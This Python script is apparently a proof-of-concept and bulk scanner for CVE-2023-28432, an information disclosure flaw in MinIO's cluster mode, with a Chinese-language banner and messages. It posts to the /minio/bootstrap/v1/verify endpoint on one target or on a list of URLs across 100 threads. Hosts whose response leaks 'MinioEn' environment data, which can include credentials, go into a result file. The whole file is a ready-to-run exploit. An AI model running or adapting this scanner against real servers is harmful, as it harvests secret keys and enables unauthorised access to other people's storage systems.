import sys,requests,time,argparse,re,threading
from multiprocessing.dummy import Pool

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2023-28432 MinIO集群模式 信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = '/minio/bootstrap/v1/verify'
    url = target + payload_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        res = requests.post(url=url,headers=headers,timeout=5)
        # print(res.text)
        if res.status_code == 200 and "MinioEn" in res.text:
            print(f"[+]该网站存在信息泄露漏洞，url为{target}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在信息泄露漏洞，url为{target}")

    except Exception as e:
        print(f"[*]该网站无法访问，url为{target}")

if __name__ == '__main__':
    main()